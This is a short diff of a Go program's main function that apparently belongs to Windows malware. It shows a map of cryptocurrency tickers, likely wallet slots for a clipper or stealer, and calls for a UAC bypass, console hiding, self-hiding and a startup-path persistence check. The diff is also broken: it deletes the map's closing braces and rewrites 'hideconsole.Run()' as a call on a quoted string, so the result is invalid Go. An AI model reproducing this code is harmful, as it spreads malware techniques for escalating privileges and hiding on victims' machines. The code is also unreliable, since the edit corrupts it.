@@ -38,12 +38,10 @@ func main() {{
 			"ADA": "",
 			"DASH": "",
 			"DOGE": "",
-		},
-	}
 
 	uacbypass.Run()
 
-	hideconsole.Run()
+	"hideconsole.Run"()
 	program.HideSelf()
 
 	if !program.IsInStartupPath() {
